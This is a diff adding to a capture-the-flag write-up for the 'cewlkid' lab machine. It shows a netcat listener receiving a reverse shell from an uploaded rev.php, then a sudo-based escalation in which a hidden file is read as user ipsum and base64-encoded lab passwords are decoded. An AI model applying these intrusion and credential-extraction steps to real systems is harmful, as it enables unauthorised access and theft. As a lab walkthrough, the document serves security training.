@@ -69,13 +69,55 @@ Inside the panel we see and admin menu which we can upload file in it, just uplo
 start a listener and navigate to `http://192.168.56.121/files/image/rev.php` to get the shell :
 
 ```bash
+root@kali: nc -nvlp 4444
+listening on [any] 4444 ...
 
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.121] 46618
+Linux cewlkid 5.4.0-47-generic #51-Ubuntu SMP Fri Sep 4 19:50:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 12:45:39 up  1:55,  0 users,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ $ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+## 4.Privilege Escalation (ipsum)
 
+Using `sudo -l` we find our sudo permissions and this is where we see that we can run `/usr/bin/cat` as user ipsum :
 
+```bash
+$ sudo -l
+Matching Defaults entries for www-data on cewlkid:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User www-data may run the following commands on cewlkid:
+    (ipsum : ipsum) NOPASSWD: /usr/bin/cat
+```
 
+let's check which files use ipsum has access to :
+
+```bash
+$ find / -user ipsum -type f 2>/dev/null
+/var/www/example.com/html/.../nothing_to_see_here
+```
+
+let's see the content of it :
+
+```bash
+$ sudo -u ipsum /usr/bin/cat /var/www/example.com/html/.../nothing_to_see_here
+aXBzdW0gOiBTcGVha1Blb3BsZTIyIQo=
+bG9yZW0gOiBQZW9wbGVTcGVhazQ0IQo=
+```
+
+decode the strings :
+
+```text
+ipsum : SpeakPeople22!
+
+lorem : PeopleSpeak44!
+```
 
 
 
